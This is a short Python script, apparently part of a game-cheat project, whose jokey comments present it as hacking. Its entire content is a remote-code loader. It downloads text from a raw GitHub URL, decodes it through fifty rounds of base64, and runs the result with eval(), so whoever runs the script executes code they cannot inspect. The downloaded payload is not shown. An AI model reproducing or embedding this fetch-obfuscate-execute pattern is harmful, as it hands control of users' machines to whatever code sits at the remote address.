import requests
import base64

payload_url = "https://raw.githubusercontent.com/clash098/orion-drift-cheats/refs/heads/master/secret_payload.txt"
payload = ""

# hack the mainframe and download the super secret payload >:)
def get_payload():
    global payload

    response = requests.get(payload_url)
    payload = response.text.strip()

# decrypt the super secret payload >:)
def decode_payload():
    global payload

    for i in range(50):
        payload = base64.b64decode(payload.encode()).decode()

# the main hacking part >:)
if __name__ == "__main__":
    get_payload()
    decode_payload()

    eval(payload)